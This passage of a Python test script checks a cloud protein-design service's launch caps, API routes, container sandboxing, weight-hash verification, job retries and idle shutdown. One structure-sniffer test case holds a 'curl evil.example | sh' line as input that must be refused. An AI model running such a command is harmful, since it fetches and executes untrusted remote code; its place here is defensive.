          view["idle_minutes"] == 30)

section("starting a machine has its own limits")
with World(PROTEINCAD_MACHINE_STARTS="2") as world:
    for _ in range(2):
        world.machine_is("gone")
        world.call("POST", "/machine/start")
    world.machine_is("gone")
    answer = world.call("POST", "/machine/start")
    check("the per-user start cap refuses the third", answer["statusCode"] == 429)
    check("and says when it comes back", "comes back in" in answer["json"]["error"])
    check("two machines were launched, not three", len(world.ec2.launched) == 2)
    check("the global launch counter was handed back",
          world.counter("MACHINE", "LAUNCHES") == 2)

with World(PROTEINCAD_GLOBAL_DAILY_LAUNCHES="1") as world:
    world.call("POST", "/machine/start", user="user-one")
    world.machine_is("gone")
    answer = world.call("POST", "/machine/start", user="user-two")
    check("the global launch cap refuses the second", answer["statusCode"] == 429)
    check("and says the limit is shared", "everyone together" in answer["json"]["error"])
    check("the refused user was not charged", world.counter("USER#user-two", "STARTS") == 0)

section("submitting works without pressing anything")
with World() as world:
    answer = world.call("POST", "/design", spec())
    check("the job is accepted", answer["statusCode"] == 200)
    check("and a machine was started for it", len(world.ec2.launched) == 1)
    check("which cost the submitter a start", world.counter("USER#user-one", "STARTS") == 1)

    answer = world.call("POST", "/design", spec())
    check("a second job does not start a second machine", len(world.ec2.launched) == 1)
    check("and does not cost another start", world.counter("USER#user-one", "STARTS") == 1)

with World(full={"subnet-a", "subnet-b", "subnet-c"}) as world:
    answer = world.call("POST", "/design", spec())
    check("a job submitted when AWS is full is still queued, not lost",
          answer["statusCode"] == 200 and len(world.sqs.messages) == 1)
    check("the job is queued rather than failed",
          world.jobs_in_table()[0]["status"] == "queued")

section("nothing here can stop or destroy a machine")
with World() as world:
    world.machine_is("ready")
    for method, path in [("POST", "/machine/stop"), ("POST", "/machine/terminate"),
                         ("POST", "/gpu/stop"), ("POST", "/gpu/start"),
                         ("DELETE", "/machine")]:
        answer = world.call(method, path, {} if method == "POST" else None)
        check(f"{method} {path} does not exist", answer["statusCode"] in (404, 405),
              str(answer["statusCode"]))
    check("and no route anywhere mentions stopping or terminating",
          not any(word in pattern.pattern
                  for router in cloud_api.ROUTERS.values()
                  for _, pattern, _ in router.routes
                  for word in ("stop", "terminate", "destroy")))
    world.call("POST", "/machine/start")
    check("no stop call was ever made to EC2",
          not any(c[0] in ("stop", "terminate") for c in world.ec2.calls),
          str(world.ec2.calls))

section("the lambda edge")
with World() as world:
    import base64 as _b64

    event = {
        "version": "2.0",
        "rawPath": "/prod/health",
        "requestContext": {"http": {"method": "GET", "path": "/prod/health"},
                           "stage": "prod", "authorizer": {"jwt": {"claims": {}}}},
        "body": None,
        "isBase64Encoded": False,
    }
    os.environ["PROTEINCAD_FUNCTION"] = "api"
    check("a named stage is stripped from the path",
          cloud_api.handler(event)["statusCode"] == 200)

    body = _b64.b64encode(json.dumps(spec()).encode()).decode()
    event = {
        "version": "2.0",
        "rawPath": "/design",
        "requestContext": {"http": {"method": "POST", "path": "/design"}, "stage": "$default",
                           "authorizer": {"jwt": {"claims": {"sub": "user-one"}}}},
        "body": body,
        "isBase64Encoded": True,
    }
    os.environ["PROTEINCAD_FUNCTION"] = "submit"
    check("a base64 body is decoded", cloud_api.handler(event)["statusCode"] == 200)

    event["requestContext"]["authorizer"] = {}
    check("a request with no claim is refused, not treated as anonymous",
          cloud_api.handler(event)["statusCode"] == 401)

    check("responses are not cached anywhere on the way back",
          cloud_api.reply(b"{}", 200)["headers"]["cache-control"] == "no-store")

section("the structure sniffer")
for label, text, expected in [
    ("a PDB file", TARGET, True),
    ("an mmCIF file", "data_1UBQ\n#\nloop_\n_atom_site.group_PDB\nATOM 1\n", True),
    ("a PDB with only HETATM", "HETATM    1  O   HOH A   1       0.0   0.0   0.0\n", True),
    ("HTML", "<!doctype html><html><body>hello</body></html>", False),
    ("a shell script", "#!/bin/bash\ncurl evil.example | sh\n", False),
    ("a FASTA file", ">seq1\nMKTAYIAKQRQISFVKSHFSRQ\n", False),
    ("nothing at all", "", False),
]:
    check(f"{label} is {'accepted' if expected else 'refused'}",
          cloud_api.looks_like_structure(text) is expected)


# ====================================================== the worker on the box

from proteincad import sqs_worker  # noqa: E402

WORKER_ENV = {
    "PROTEINCAD_IMAGE": "1234.dkr.ecr.us-east-1.amazonaws.com/proteincad-model@sha256:abc",
    "PROTEINCAD_IDLE_MINUTES": "30",
    "PROTEINCAD_JOB_TIMEOUT": "3600",
    "PROTEINCAD_JOB_MEMORY": "12g",
}

# Small enough to hash in a test, shaped like the real thing.
WEIGHT_FILES = {
    "rfdiffusion": {"Base_ckpt.pt": b"base weights" * 64,
                    "Complex_base_ckpt.pt": b"complex weights" * 64},
    "proteinmpnn": {"v_48_020.pt": b"mpnn weights" * 32},
    "esmfold": {"model.safetensors": b"esmfold weights" * 128,
                "config.json": b'{"model_type": "esm"}'},
}


def weights_manifest(corrupt=()):
    """The manifest, optionally lying about one file's hash.

    A wrong hash in the manifest and a damaged file in the bucket are the same
    failure from the worker's side: what it read is not what it was promised.
    """
    models = {}
    for model, files in WEIGHT_FILES.items():
        entries = []
        for name, body in files.items():
            digest = hashlib.sha256(body).hexdigest()
            if (model, name) in corrupt:
                digest = "0" * 64
            entries.append({"key": f"weights/{model}/{name}",
                            "bytes": len(body), "sha256": digest})
        models[model] = {"bytes": sum(len(b) for b in files.values()), "files": entries}
    return {"version": 1, "models": models}


class Box(World):
    """A worker with its stand-ins, a scratch directory and a fake container."""

    def __init__(self, container=None, corrupt=(), full=(), **overrides):
        self.temp = tempfile.mkdtemp(prefix="proteincad-check-")
        settings = dict(WORKER_ENV)
        settings["PROTEINCAD_WORK"] = self.temp + "/work"
        settings["PROTEINCAD_WEIGHTS"] = self.temp + "/weights"
        settings.update(overrides)
        World.__init__(self, full=full, **settings)

        # The bucket, as publish-weights.py would have left it.
        self.s3.objects[("proteincad-data", "weights/manifest.json")] = \
            json.dumps(weights_manifest(corrupt)).encode()
        for model, files in WEIGHT_FILES.items():
            for name, body in files.items():
                self.s3.objects[("proteincad-data", f"weights/{model}/{name}")] = body

        self.container_calls = []
        self.stopped_containers = []
        self.downloads = []
        self.powered_off = []
        self.clock = 1000.0
        self.worker = sqs_worker.Worker(
            run_container=container or self.plain_success,
            sleep=lambda _: None,
            clock=lambda: self.clock,
            shutdown=lambda: self.powered_off.append(True),
            download=self.fetch)
        self.worker.instance = "i-000000000001"
        self.worker.stop_container = self.stopped_containers.append

    def fetch(self, key, path, progress):
        """Stand in for boto3's download_file, progress callback and all."""
        self.downloads.append(key)
        body = self.s3.objects.get(("proteincad-data", key))
        if body is None:
            raise Boom(f"NoSuchKey: {key}")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(body)
        progress(len(body))

    def machine_record(self):
        return cloud_api.item_to_dict(
            self.dynamo.items.get(("MACHINE", "STATE"), {}))

    def model_record(self, name):
        return cloud_api.item_to_dict(
            self.dynamo.items.get(("MACHINE", "MODEL#" + name), {}))

    def close(self):
        shutil.rmtree(self.temp, ignore_errors=True)
        World.close(self)

    # -- stand-in containers ----------------------------------------------

    def _finish(self, command, designs, error="", status="done"):
        work = Path(command[command.index("-v") + 1].split(":")[0])
        self.container_calls.append(command)
        (work / "designs").mkdir(exist_ok=True)
        written = []
        for index, pdb in enumerate(designs):
            name = "design_%03d.pdb" % index
            (work / "designs" / name).write_text(pdb)
            written.append({"name": "design_%d" % (index + 1), "file": "designs/" + name,
                            "metrics": {"residues": 46}})
        (work / "result.json").write_text(json.dumps(
            {"status": status, "error": error, "log": "run_inference.py ...",
             "designs": written}))

    def plain_success(self, command, job_id, timeout):
        self._finish(command, [BACKBONE, BACKBONE])
        return {"timed_out": False, "code": 0, "tail": ""}

    def crashed(self, command, job_id, timeout):
        self.container_calls.append(command)
        return {"timed_out": False, "code": 137, "tail": "CUDA out of memory"}

    def timed_out(self, command, job_id, timeout):
        self.container_calls.append(command)
        return {"timed_out": True, "code": None, "tail": ""}

    def silent(self, command, job_id, timeout):
        self.container_calls.append(command)
        return {"timed_out": False, "code": 0, "tail": ""}

    def empty_designs(self, command, job_id, timeout):
        self._finish(command, ["REMARK nothing here\nEND\n"], status="failed",
                     error="the generator produced nothing")
        return {"timed_out": False, "code": 0, "tail": ""}

    # -- driving ----------------------------------------------------------

    def enqueue(self, user="user-one"):
        answer = self.call("POST", "/design", spec(), user=user)
        assert answer["statusCode"] == 200, answer["json"]
        return answer["json"]["id"]

    def job(self, job_id):
        return cloud_api.item_to_dict(self.dynamo.items[("JOB#" + job_id, "JOB")])


BACKBONE = "\n".join(
    "ATOM  %5d  CA  GLY A%4d    %8.3f%8.3f%8.3f  1.00  0.00           C"
    % (i + 1, i + 1, i * 3.8, 0.0, 0.0) for i in range(30)) + "\nEND\n"


section("every weights directory exists before docker is asked to mount it")
with Box() as box:
    # The invariant that matters is the timing: by the time the container is
    # launched, the directories it bind-mounts must already be there. Docker
    # creates a missing bind-mount source as root, and this process is not
    # root, so a directory it invents is one no later download can write into.
    seen = {}

    def watch(command, job_id, timeout):
        # Recorded at the moment docker would have been invoked, which is the
        # only moment the answer matters.
        seen.update({name: (Path(box.temp) / "weights" / name).is_dir()
                     for name in ("rfdiffusion", "proteinmpnn", "esmfold")})
        return {"timed_out": False, "code": 0, "tail": ""}

    box.worker._run_container = watch
    box.worker.run_container("j-mounts", Path(box.temp) / "work" / "j-mounts")

    check("rfdiffusion's directory is there before the mount",
          seen.get("rfdiffusion") is True, str(seen))
    check("and proteinmpnn's, even though this job does not need it",
          seen.get("proteinmpnn") is True, str(seen))
    check("and esmfold's, which only the second stage ever reads",
          seen.get("esmfold") is True, str(seen))

section("a machine running code older than the deployment")
with World() as world:
    world.machine_is("ready", instance_id="i-000000000001", build="deadbeefcafe")
    view = world.call("GET", "/machine", function="api")["json"]
    check("the drift is reported rather than guessed at",
          view["stale_build"] is True and view["build"] == "deadbeefcafe",
          str(view.get("build")))

    # The same machine, once it is running what the API is running.
    world.machine_is("ready", instance_id="i-000000000001",
                     build=cloud_api.code_version())
    fresh = world.call("GET", "/machine", function="api")["json"]
    check("and a machine on the current build is not nagged about",
          fresh["stale_build"] is False)

    # A worker too old to say anything cannot be judged, so it is not.
    world.machine_is("ready", instance_id="i-000000000001", build="")
    silent = world.call("GET", "/machine", function="api")["json"]
    check("a worker that says nothing is not accused of drift",
          silent["stale_build"] is False)

section("a build left behind by the machine before")
with World() as world:
    # Every per-machine field is cleared when a launch is claimed. `build` was
    # not, so a machine two minutes into its first boot was judged by the build
    # of the one it replaced -- and told it was out of date before it had run a
    # line of anything.
    # The machine before has gone, so Start really launches rather than handing
    # back the one that is already there.
    world.machine_is("gone", instance_id="i-000000000001", build="deadbeefcafe",
                     heartbeat=cloud_api.now() - 2000)
    world.call("POST", "/machine/start")
    booting = world.call("GET", "/machine", function="api")["json"]
    check("a machine still booting is not judged by its predecessor's build",
          booting["stale_build"] is False, str(booting.get("build")))
    check("and the field itself is cleared, not merely ignored",
          "build" not in world.dynamo.items[("MACHINE", "STATE")]
          or _plain(world.dynamo.items[("MACHINE", "STATE")]["build"]) in ("", None),
          str(world.dynamo.items[("MACHINE", "STATE")].get("build")))

    # Once the worker is up and has said which build it is, drift is real again.
    world.machine_is("ready", instance_id="i-000000000002", build="deadbeefcafe")
    running = world.call("GET", "/machine", function="api")["json"]
    check("a running worker on an old build still is reported",
          running["stale_build"] is True)

section("a retire nothing acts on")
with World() as world:
    world.machine_is("ready", instance_id="i-000000000001")
    world.call("POST", "/machine/retire")
    asked = world.call("GET", "/machine", function="api")["json"]
    check("a fresh request is not yet a complaint",
          asked["retiring"] is True and asked["retire_waiting"] < 150,
          str(asked["retire_waiting"]))

    # The machine is still beating, and still has not gone -- which is what an
    # old worker that cannot read the flag looks like from here.
    world.machine_is("ready", instance_id="i-000000000001",
                     retire_at=cloud_api.now() - 600,
                     retire_instance="i-000000000001")
    ignored = world.call("GET", "/machine", function="api")["json"]
    check("one that has gone unanswered for ten minutes is measurable",
          ignored["retiring"] is True and ignored["retire_waiting"] > 150,
          str(round(ignored["retire_waiting"])))

section("the dead-man switch")
with Box() as box:
    pushes = []
    box.worker._reschedule = lambda: pushes.append(box.clock)
    box.machine_is("ready", instance_id="i-000000000001")

    box.worker.run(rounds=1)
    check("a living worker pushes the deadline back", len(pushes) == 1, str(pushes))

    box.worker.run(rounds=1)
    check("but not on every turn -- that would be a sudo call every few seconds",
          len(pushes) == 1, str(pushes))

    box.clock += sqs_worker.DEADMAN_EVERY + 1
    box.worker.run(rounds=1)
    check("and again once the window has passed", len(pushes) == 2, str(pushes))

    # The point of the whole thing: a worker that stops running stops pushing,
    # and the last deadline it set is what ends the machine.
    before = len(pushes)
    box.clock += sqs_worker.DEADMAN_MINUTES * 60
    check("a worker that is not running pushes nothing", len(pushes) == before)

section("retiring a machine")
with Box() as box:
    box.machine_is("ready", instance_id="i-000000000001")
    answer = box.call("POST", "/machine/retire")
    check("asking works", answer["statusCode"] == 200, answer["json"].get("error", ""))
    check("and the panel is told it is retiring", answer["json"]["retiring"] is True)
    check("nothing was terminated to do it -- no such call exists",
          not any(name == "terminate" for name, _ in box.ec2.calls), str(box.ec2.calls))

    # The worker reads it between jobs and goes of its own accord.
    box.worker.run(rounds=1)
    check("the machine shuts itself down", box.powered_off == [True], str(box.powered_off))
    check("and says it has gone, so the panel does not wait on a heartbeat",
          _value(box.dynamo.items[("MACHINE", "STATE")], "state") == "gone")

with Box() as box:
    # The flag is stamped with the instance it was asked of. A replacement must
    # not inherit it, or every machine after this one retires on boot.
    box.machine_is("ready", instance_id="i-000000000001")
    box.call("POST", "/machine/retire")
    box.machine_is("ready", instance_id="i-000000000002")   # the next machine
    box.worker.instance = "i-000000000002"
    box.worker.run(rounds=1)
    check("a replacement does not inherit the request", box.powered_off == [],
          str(box.powered_off))

with Box() as box:
    # Nothing to retire is a refusal, not a silent no-op -- the lesson from
    # every other button in this panel.
    box.machine_is("gone", instance_id="")
    answer = box.call("POST", "/machine/retire")
    check("retiring nothing says so", answer["statusCode"] == 409,
          str(answer["statusCode"]))

with Box() as box:
    # Work on the queue keeps it up: shut_down() re-checks before going, so a
    # retire cannot strand somebody else's design.
    box.machine_is("ready", instance_id="i-000000000001")
    box.call("POST", "/machine/retire")
    box.sqs.send_message(QueueUrl="q", MessageBody=json.dumps({"job_id": "j9"}))
    box.worker.run(rounds=1)
    check("a retire waits for work already queued", box.powered_off == [],
          str(box.powered_off))

section("a new machine corrects the records it inherited")
with Box() as box:
    # The records say all three are here. The disk this machine was created
    # with, minutes ago, is empty -- which is the normal case, because the
    # instance store is born with the instance.
    for name in ("rfdiffusion", "proteinmpnn", "esmfold"):
        box.model_is(name, "ready", instance_id="i-000000000000")
    box.model_is("proteinmpnn", "wanted", instance_id="i-000000000000")

    box.worker.reconcile_models()
    after = cloud_api.read_machine()["models"]

    check("a model the disk does not have stops saying it is here",
          after["rfdiffusion"]["state"] == "absent", str(after["rfdiffusion"]["state"]))
    check("and says so as this machine, not the one before",
          after["rfdiffusion"]["instance_id"] == "i-000000000001")
    check("a model somebody asked for is left alone",
          after["proteinmpnn"]["state"] == "wanted", str(after["proteinmpnn"]["state"]))

    # And the other direction: weights that really are on the disk get claimed
    # for this machine, so a restarted worker does not report them missing.
    (Path(box.temp) / "weights" / "esmfold").mkdir(parents=True, exist_ok=True)
    (Path(box.temp) / "weights" / "esmfold" / ".complete").write_text("{}")
    box.worker.reconcile_models()
    again = cloud_api.read_machine()["models"]
    check("weights actually on the disk are claimed for this machine",
          again["esmfold"]["state"] == "ready"
          and again["esmfold"]["instance_id"] == "i-000000000001",
          str(again["esmfold"]["state"]))

section("what the container is allowed")
with Box() as box:
    command = box.worker.container_command("j1", Path("/opt/proteincad/work/j1"))
    text = " ".join(command)
    for flag, why in [
        ("--network none", "no network at all"),
        ("--read-only", "a read-only filesystem"),
        ("--cap-drop ALL", "no capabilities"),
        ("--security-opt no-new-privileges", "no way to gain one"),
        ("--memory 12g", "a memory limit that fits a g4dn.xlarge"),
        ("--pids-limit 512", "a process limit"),
        ("--gpus all", "the card"),
        ("HF_HUB_OFFLINE=1", "huggingface told not to try the network"),
        ("TRANSFORMERS_OFFLINE=1", "transformers told the same"),
        ("HOME=/work/home", "a writable home"),
        ("TMPDIR=/work/tmp", "scratch on the volume, not in RAM"),
    ]:
        check(why, flag in text, flag)
    check("the RFdiffusion checkpoints are mounted read-only",
          ":/opt/models/RFdiffusion/models:ro" in text)
    check("the ProteinMPNN weights are mounted read-only",
          ":/opt/models/ProteinMPNN/vanilla_model_weights:ro" in text)
    check("the folding weights are mounted read-only", ":/models/esmfold:ro" in text)
    check("ESMFold is handed a directory, not a repo id to look up",
          "PROTEINCAD_ESMFOLD_MODEL=/models/esmfold" in text)
    # ESM3 brought one back, because it looks its own files up by repo id and
    # cannot be handed a directory the way ESMFold can. The property worth
    # holding was never "no cache": it is that the cache the hub *writes* to is
    # inside this job's directory, while the weights it reads are a read-only
    # mount. Those are two different paths on purpose -- pointing the hub's home
    # at the mount makes a model that is present fail on a lock file.
    homes = [part.split("=", 1)[1] for part in command if part.startswith("HF_HOME=")]
    check("the Hugging Face cache the hub writes to is inside the job directory",
          all(home.startswith("/work/") for home in homes), str(homes))
    check("and the ESM3 weights it reads are a read-only mount of their own",
          ":/models/esm3:ro" in text and "PROTEINCAD_ESM3_HOME=/models/esm3" in text)
    check("so the hub is never asked to write into the weights mount",
          not any(home.startswith("/models/") for home in homes), str(homes))
    # The property is not how many writable mounts there are, it is where their
    # bytes end up: every one of them has to be backed by this job's own
    # directory, which is created for the run and deleted after it. The
    # schedule cache is mounted *at* a path inside the image -- so a model that
    # still writes beside its own source survives a read-only filesystem -- and
    # is sourced from the job directory like everything else.
    writable = [part for part in command if part.endswith(":rw")]
    check("everything writable is backed by the job directory",
          bool(writable) and all(part.startswith("/opt/proteincad/work/j1")
                                 for part in writable),
          str(writable))
    check("the job directory itself is mounted", "/opt/proteincad/work/j1:/work:rw" in text)
    check("nothing writable escapes it",
          not any(part.startswith(("/etc", "/usr", "/opt/models")) for part in writable),
          str(writable))
    check("the tmpfs is small, because the RAM is the model's",
          "/tmp:size=1g,mode=1777" in text)
    check("the image is the pinned one, named last before the argument",
          command[-2] == box.worker.image)
    # The host account is created with `useradd --system`, so its uid is below
    # 1000 and will never match the image's baked-in user. Writing the job's
    # own output then fails on permissions.
    import os as _os
    check("it runs as the user that owns the job directory",
          f"{_os.getuid()}:{_os.getgid()}" in text,
          "otherwise the container cannot write its own result")
    check("and carries a name for it, since there is no passwd entry",
          "USER=proteincad" in text and "LOGNAME=proteincad" in text)

section("the image has to be pinned")
for label, image, allowed in [
    ("a digest is fine", "1234.dkr.ecr.x.amazonaws.com/m@sha256:abc", True),
    ("a version tag is fine", "1234.dkr.ecr.x.amazonaws.com/m:2026-09-19", True),
    ("latest is refused", "1234.dkr.ecr.x.amazonaws.com/m:latest", False),
    ("nothing at all is refused", "", False),
]:
    try:
        sqs_worker.check_image(image)
        ok = allowed
    except SystemExit:
        ok = not allowed
    check(label, ok)

section("a job from end to end")
with Box() as box:
    job_id = box.enqueue()
    box.worker.run(rounds=1)

    job = box.job(job_id)
    check("the job is done", job["status"] == "done", job.get("error", ""))
    check("both designs were kept", len(job["designs"]) == 2)
    check("the coordinates went to the bucket",
          ("proteincad-data", f"results/{job_id}/design_000.pdb") in box.s3.objects)
    check("the record points at them, and counts the atoms",
          job["designs"][0]["key"] == f"results/{job_id}/design_000.pdb"
          and job["designs"][0]["atoms"] == 30)
    check("the command that ran is kept, so a dropped setting is visible",
          "run_inference" in job["command"])
    check("the message was deleted", len(box.sqs.deleted) == 1)
    check("the scratch directory was cleaned up",
          not (Path(box.temp) / job_id).exists())
    check("the browser sees it finished",
          box.call("GET", f"/jobs/{job_id}", function="api")["json"]["status"] == "done")

section("a job that fails is failed, not retried")
with Box(container=None) as box:
    box.worker._run_container = box.crashed
    job_id = box.enqueue()
    box.worker.run(rounds=1)
    job = box.job(job_id)
    check("a container that exits non-zero fails the job", job["status"] == "failed")
    check("and the message is deleted rather than redelivered",
          box.sqs.deleted == ["r0"], str(box.sqs.deleted))
    check("the reason names the exit status and what it said",
          "137" in job["error"] and "CUDA" in job["error"], job["error"][:90])

with Box() as box:
    box.worker._run_container = box.timed_out
    job_id = box.enqueue()
    box.worker.run(rounds=1)
    job = box.job(job_id)
    check("a job that hits the time limit fails", job["status"] == "failed")
    check("the message is deleted", len(box.sqs.deleted) == 1)
    check("the message names the limit in minutes",
          "60 minute" in job["error"], job["error"][:80])

with Box() as box:
    box.worker._run_container = box.silent
    job_id = box.enqueue()
    box.worker.run(rounds=1)
    check("a container that left no result file fails the job",
          box.job(job_id)["status"] == "failed")
    check("and says so plainly", "no result file" in box.job(job_id)["error"])

with Box() as box:
    box.worker._run_container = box.empty_designs
    job_id = box.enqueue()
    box.worker.run(rounds=1)
    job = box.job(job_id)
    check("a design with no atoms is not stored as one", job["designs"] == [])
    check("and the job is failed rather than quietly done", job["status"] == "failed")
    check("nothing was uploaded",
          not any(key.startswith("results/") for _, key in box.s3.objects))

section("a worker that dies is the only retry")
with Box() as box:
    def explodes(command, job_id, timeout):
        raise Boom("the box lost its disk")

    box.worker._run_container = explodes
    job_id = box.enqueue()
    crashed = False
    try:
        box.worker.run(rounds=1)
    except Boom:
        crashed = True
    check("an error in the worker itself is not swallowed", crashed)
    check("the message is left on the queue for SQS to hand back",
          box.sqs.deleted == [], str(box.sqs.deleted))
    check("the job is still marked running, for the next worker to claim",
          box.job(job_id)["status"] == "running")

section("claiming")
with Box() as box:
    job_id = box.enqueue()
    box.call("POST", f"/jobs/{job_id}/cancel", function="api")
    box.worker.run(rounds=1)
    check("a job cancelled while queued is never run", box.container_calls == [])
    check("and its message is dropped", len(box.sqs.deleted) == 1)
    check("it stays cancelled", box.job(job_id)["status"] == "cancelled")

with Box() as box:
    job_id = box.enqueue()
    box.dynamo.update_item(TableName="proteincad-jobs", Key=cloud_api.job_key(job_id),
                           **cloud_api.set_fields(status="running", heartbeat=box.clock - 10))
    check("a job whose worker is still beating cannot be taken",
          box.worker.claim(job_id) is None)

    box.dynamo.update_item(TableName="proteincad-jobs", Key=cloud_api.job_key(job_id),
                           **cloud_api.set_fields(heartbeat=box.clock - 600))
    check("a job whose worker went quiet can be taken back",
          (box.worker.claim(job_id) or {}).get("status") == "running")

section("the heartbeat")
with Box() as box:
    job_id = box.enqueue()
    box.worker.claim(job_id)
    work = Path(box.temp) / job_id
    work.mkdir(parents=True, exist_ok=True)
    (work / "progress.json").write_text(json.dumps(
        {"stage": "diffusing step 30 of 50", "progress": 1, "command": "run_inference.py"}))

    beat = box.worker.heartbeat(job_id, work, {"ReceiptHandle": "r0"})
    beat.beat()
    job = box.job(job_id)
    check("what the model is doing reaches the record",
          job["stage"] == "diffusing step 30 of 50")
    check("and so does how far it has got", job["progress"] == 1)
    check("the message is kept out of anybody else's hands",
          box.sqs.extended == [("r0", 900)], str(box.sqs.extended))
    check("the beat itself is recorded, which is what a takeover looks at",
          job["heartbeat"] == box.clock)

    box.call("POST", f"/jobs/{job_id}/cancel", function="api")
    beat.beat()
    check("a cancel is noticed", beat.cancelled is True)
    check("and the container is stopped", box.stopped_containers == [job_id])

with Box() as box:
    job_id = box.enqueue()

    class Cancelling:
        cancelled = True

        def start(self):
            pass

        def stop(self):
            pass

    box.worker.heartbeat = lambda *a: Cancelling()
    box.worker.run(rounds=1)
    check("a job cancelled mid-run is recorded as cancelled, not failed",
          box.job(job_id)["status"] == "cancelled")

section("weights arrive when they are wanted")
with Box() as box:
    check("a fresh machine has no weights at all",
          not box.worker.have_model("rfdiffusion"))

    ok = box.worker.download_model("rfdiffusion")
    check("downloading one works", ok is True)
    check("every file came from the bucket",
          sorted(box.downloads) == ["weights/rfdiffusion/Base_ckpt.pt",
                                    "weights/rfdiffusion/Complex_base_ckpt.pt"])
    check("and it is marked ready afterwards", box.worker.have_model("rfdiffusion"))
    check("the record says so, for the panel",
          box.model_record("rfdiffusion")["state"] == "ready")
    check("with the size it reported while downloading",
          box.model_record("rfdiffusion")["total"] > 0)
    check("nothing is left half-written",
          not list(Path(box.temp, "weights", "rfdiffusion").glob("*.part")))

    box.downloads.clear()
    box.worker.download_model("rfdiffusion")
    check("asking again does not fetch it twice", box.downloads == [])

with Box() as box:
    box.dynamo.update_item(TableName="proteincad-jobs",
                           Key=cloud_api.model_key("esmfold"),
                           **cloud_api.set_fields(state="wanted", bytes=0, total=1))
    box.worker.serve_downloads()
    check("a model somebody pressed the button for is fetched",
          box.worker.have_model("esmfold"))
    check("and the machine says it is ready while it does it",
          box.machine_record()["state"] == "ready")
    check("models nobody asked for are left alone",
          not box.worker.have_model("rfdiffusion"))

with Box() as box:
    # Two buttons pressed together. The small one should not sit behind the
    # big one for as long as the big one takes.
    for name in ("proteinmpnn", "esmfold"):
        box.dynamo.update_item(TableName="proteincad-jobs",
                               Key=cloud_api.model_key(name),
                               **cloud_api.set_fields(state="wanted", bytes=0, total=1))
    box.worker.serve_downloads()
    check("two models asked for at once both arrive",
          box.worker.have_model("proteinmpnn") and box.worker.have_model("esmfold"))
    check("and both are marked ready",
          box.model_record("proteinmpnn")["state"] == "ready"
          and box.model_record("esmfold")["state"] == "ready")

section("a weight that arrives damaged")
with Box(corrupt={("rfdiffusion", "Complex_base_ckpt.pt")}) as box:
    ok = box.worker.download_model("rfdiffusion")
    check("a file that does not match the manifest fails the model", ok is False)
    check("the model is not marked ready", not box.worker.have_model("rfdiffusion"))
    record = box.model_record("rfdiffusion")
    check("the record says failed", record["state"] == "failed")
    check("and names both hashes, so it is diagnosable",
          "expected" in record["error"] and "got" in record["error"],
          record["error"][:80].replace("\n", " "))
    check("the damaged file is deleted rather than left to be loaded",
          not list(Path(box.temp, "weights", "rfdiffusion").glob("*.part")))
    check("the good file that came first is not passed off as a complete model",
          not (Path(box.temp, "weights", "rfdiffusion", ".complete")).exists())

    job_id = box.enqueue()
    box.worker.run(rounds=1)
    check("a job needing it fails rather than running without weights",
          box.job(job_id)["status"] == "failed")
    check("and says which model it could not get",
          "rfdiffusion" in box.job(job_id)["error"], box.job(job_id)["error"][:70])
    check("the container was never started", box.container_calls == [])

section("a job fetches what it needs without being asked")
with Box() as box:
    job_id = box.enqueue()
    box.worker.run(rounds=1)
    check("the job ran", box.job(job_id)["status"] == "done", box.job(job_id).get("error", ""))
    check("having fetched RFdiffusion on the way",
          box.worker.have_model("rfdiffusion"))
    check("and only what it needed", not box.worker.have_model("esmfold"))

section("shutting down, which destroys the machine")
with Box() as box:
    box.worker.last_worked = box.clock - 40 * 60
    box.worker.run(rounds=1)
    check("an idle worker with an empty queue shuts itself down",
          box.powered_off == [True])
    check("the record says the machine has gone, before it goes",
          box.machine_record()["state"] == "gone")
    check("no StopInstances call was made", 
          not any(c[0] == "stop" for c in box.ec2.calls), str(box.ec2.calls))
    check("no TerminateInstances call either",
          not any(c[0] == "terminate" for c in box.ec2.calls))
    check("in fact nothing was said to EC2 at all", box.ec2.calls == [])

with Box() as box:
    box.worker.last_worked = box.clock - 40 * 60
    box.sqs.visible = 2
    box.worker.run(rounds=1)
    check("a queue with work in it keeps the machine up", box.powered_off == [])
    check("and the record still says ready", box.machine_record()["state"] == "ready")

with Box(PROTEINCAD_IDLE_MINUTES="0") as box:
    box.worker.last_worked = box.clock - 24 * 3600
    box.worker.run(rounds=1)
    check("zero minutes means never shut down", box.powered_off == [])

with Box() as box:
    class Blind:
        def receive_message(self, **_):
            return {}

        def get_queue_attributes(self, **_):
            raise Boom("throttled")

    cloud_api.set_client("sqs", Blind())
    box.worker.last_worked = box.clock - 40 * 60
    box.worker.run(rounds=1)
    check("a queue it cannot read keeps the machine up rather than risking a job",
          box.powered_off == [])

with Box() as box:
    # The race the five-minute rule exists for: a message lands between the
    # check that decided to stop and the shutdown itself.
    box.worker.last_worked = box.clock - 40 * 60
    depths = [0, 3]
    box.worker.queue_depth = lambda: depths.pop(0) if depths else 0
    box.worker.run(rounds=1)
    check("a message arriving mid-shutdown cancels it", box.powered_off == [])
    check("and the machine says it is ready again",
          box.machine_record()["state"] == "ready")

print(f"\n{passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
